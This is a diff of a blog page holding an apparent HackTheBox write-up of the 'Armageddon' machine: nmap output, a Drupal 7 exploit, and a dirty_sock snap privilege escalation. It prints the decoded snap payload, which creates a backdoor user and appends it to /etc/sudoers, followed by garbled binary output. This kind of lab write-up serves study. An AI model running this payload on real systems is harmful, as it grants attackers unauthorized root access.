@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<title>Armageddon :: RoundofThree</title>
+<title>Armageddon - HackTheBox machine :: RoundofThree</title>
 <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content="Enumeration 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
-# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." name="description"/>
+<meta content="Rank: easy  Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
+# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0." name="description"/>
 <meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
 <meta content="noodp" name="robots"/>
 <link href="/labs/armageddon/" rel="canonical"/>
@@ -17,9 +17,9 @@
 <meta content="RoundofThree" name="twitter:creator"/>
 <meta content="en" property="og:locale"/>
 <meta content="article" property="og:type"/>
-<meta content="Armageddon" property="og:title"/>
-<meta content="Enumeration 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
-# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." property="og:description"/>
+<meta content="Armageddon - HackTheBox machine" property="og:title"/>
+<meta content="Rank: easy  Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
+# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0." property="og:description"/>
 <meta content="/labs/armageddon/" property="og:url"/>
 <meta content="RoundofThree" property="og:site_name"/>
 <meta content="/favicon.png" property="og:image"/>
@@ -63,7 +63,7 @@
 <div class="content">
 <div class="post">
 <h1 class="post-title">
-<a href="/labs/armageddon/">Armageddon</a></h1>
+<a href="/labs/armageddon/">Armageddon - HackTheBox machine</a></h1>
 <div class="post-meta">
 <span class="post-date">
         2021-09-07 
@@ -76,7 +76,10 @@
     
   </span>
 <div class="post-content"><div>
-<h2 id="enumeration">Enumeration<a arialabel="Anchor" class="hanchor" href="#enumeration">⌗</a> </h2>
+<ul>
+<li>Rank: easy</li>
+</ul>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
 <p>1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).</p>
 <pre tabindex="0"><code># Nmap 7.91 scan initiated Sat Jul  3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233
 Nmap scan report for 10.10.10.233
@@ -140,24 +143,25 @@ sudo snap install --devmode leet.snap
 su dirty_sock <span style="color:#75715e"># password dirty_sock, it has (ALL):ALL:ALL privileges. </span>
 sudo su
 </code></pre></div><hr/>
-<p>dirty_sock exploit base64 decoded:
-hsqs!V\�������������&gt;x#!/bin/bash</p>
-<p>useradd dirty_sock -m -p ‘$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.’ -s /bin/bash
+<p>dirty_sock exploit base64 decoded:</p>
+<pre tabindex="0"><code>hsqs!V\�������������&gt;x#!/bin/bash
+
+useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
 usermod -aG sudo dirty_sock
-echo “dirty_sock    ALL=(ALL:ALL) ALL” » /etc/sudoers
+echo "dirty_sock    ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers
 name: dirty-sock
-version: ‘0.1’
+version: '0.1'
 summary: Empty snap, used for exploit
-description: ‘See <a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></p>
-<p>'
-architectures:</p>
-<ul>
-<li>amd64
+description: 'See https://github.com/initstring/dirty_sock
+
+  '
+architectures:
+- amd64
 confinement: devmode
 grade: devel
-��7zXZi"�6�d�!:)ȉ��]��Z���ꮚ�E��9&gt;�Y���`dQ�R����d詯qj|��٩n��^5��I]u�#�Jq�A�uK9��Uy������YZ��7zXZi"�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�	$l5K�(�y���	_ͼӡ�h�D��u
-�'�yE�YZ8��&lt;\���&gt;��base64: invalid input</li>
-</ul>
+��7zXZi"�6�d�!:)ȉ��\]��Z���ꮚ�E��9&gt;�Y���`dQ�R����d詯qj|��٩n��^5��I]u�#�Jq�A�uK9��Uy������YZ��7zXZi"�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�	$l5K�(�y���	_ͼӡ�h�D��u
+                                                                                  �'�yE�YZ8��&lt;\���&gt;��base64: invalid input
+</code></pre>
 </div></div>
 </div>
 </div>
